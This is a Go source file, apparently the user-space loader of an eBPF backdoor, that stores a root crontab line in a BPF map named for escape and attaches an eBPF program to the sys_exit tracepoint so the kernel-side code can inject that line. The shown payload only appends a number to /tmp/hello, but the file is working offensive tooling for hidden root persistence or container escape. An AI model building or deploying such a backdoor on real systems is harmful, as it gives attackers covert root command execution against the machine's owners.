//go:build 386 || amd64

package backdoor

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"
)

const bpf_map_key uint32 = 7

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -target amd64 bpf ../c/backdoor.c -- -I../c/headers

func Backdoor() {
	payload := "* * * * * root  /bin/bash -c \"echo 114514 >> /tmp/hello\" \n#"
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal(err)
	}
	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %v", err)
	}
	defer objs.Close()

	if err := objs.BpfForEscape.Update(
		bpf_map_key,
		bpfPayloadMap{Payload: stringToInt8(payload)},
		ebpf.UpdateAny); err != nil {
		fmt.Println(err)
	}

	rtp, err := link.AttachRawTracepoint(link.RawTracepointOptions{
		Name:    "sys_exit",
		Program: objs.RawTpSysExit,
	})
	if err != nil {
		log.Fatalf("opening tracepoint: %s", err)
	}
	defer rtp.Close()

	fmt.Println("Successfully started! Please run the command to see output of the BPF programs.")
	fmt.Println("sudo cat /sys/kernel/debug/tracing/trace_pipe")
	<-stopper
}
